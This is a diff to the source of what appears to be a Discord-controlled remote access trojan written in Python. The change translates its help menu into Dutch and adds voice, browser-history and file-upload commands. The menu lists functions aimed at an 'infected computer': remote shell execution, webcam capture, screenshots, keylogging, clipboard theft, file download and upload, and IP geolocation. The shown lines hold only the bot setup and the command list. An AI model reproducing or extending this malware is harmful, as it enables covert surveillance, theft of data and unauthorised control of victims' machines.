@@ -19,26 +19,30 @@ appdata = os.getenv('APPDATA')
 client = discord.Client()
 bot = commands.Bot(command_prefix='!')
 helpmenu = """
-Availaible commands are :
---> !message = Show a message box displaying your text / Syntax  = "!message example"
---> !shell = Execute a shell command /Syntax  = "!shell whoami"
---> !webcampic = Take a picture from the webcam
---> !windowstart = Start logging current user window (logging is shown in the bot activity)
---> !windowstop = Stop logging current user window 
---> !admincheck = Check if program has admin privileges
---> !sysinfo = Gives info about infected computer
---> !download = Download a file from infected computer
---> !cd = Changes directory
---> !write = Type your desired sentence on infected computer
---> !clipboard = Retrieve infected computer clipboard content
---> !geolocate = Geolocate computer using latitude and longitude of the ip address with google map / Warning : Geolocating IP addresses is not very precise
---> !startkeylogger = Starts a keylogger / Warning : Likely to trigger AV 
---> !stopkeylogger = Stops keylogger
---> !dumpkeylogger = Dumps the keylog
---> !idletime = Get the idle time of user
---> !screenshot = Get the screenshot of the user's current screen
---> !exit = Exit program
---> !kill = Kill a session or all sessions except current one / Syntax = "!kill session-3" or "!kill all"
+Lijst me commands:
+
+--> !message = Toon een berichtvenster met  tekst/ Syntaxis = "!message example"
+--> !shell = Voer een shell-opdracht uit   = "!shell whoami"
+--> !webcampic = Maak een foto van de webcam
+--> !windowstart = Start het loggen van het huidige gebruiker (loggen wordt getoond in de botactiviteit)
+--> !windowstop = Stop het loggen van het huidige gebruiker
+--> !voice = Laat een stem hardop zeggen in een aangepaste zin / Syntax = "!voice test"
+--> !admincheck = Controleer of je admin rechten hebt
+--> !sysinfo = Geeft informatie over de computer
+--> !history = Geschiedenis ophalen van de computer
+--> !download = Download een bestand van een geïnfecteerde computer
+--> !upload = Upload bestand van website naar computer / Syntax = "!upload file.png" (met bijlage)
+--> !cd = Wijzigingen map
+--> !write = Typ de gewenste zin op de geïnfecteerde computer
+--> !clipboard = Haal de inhoud van het klembord van een geïnfecteerde computer op
+--> !geolocate = Geolokaliseer de computer met behulp van de breedte- en lengtegraad van het ip-adres met google map / Waarschuwing: het geolokaliseren van IP-adressen is niet erg nauwkeurig
+--> !startkeylogger = Start een keylogger / Waarschuwing: Waarschijnlijk wordt AV geactiveerd
+--> !stopkeylogger = Stopt keylogger
+--> !dumpkeylogger = Dumpt de keylog
+--> !idletime = De inactieve tijd van de gebruiker ophalen
+--> !screenshot = Maakt een screenshot van het scherm van de gebruiker
+--> !exit = Programma afsluiten
+--> !kill = Beëindig de sessie of alle sessies behalve de huidige / Syntaxis = "!kill session-3" of "!kill all"
 """
 
 async def activity(client):
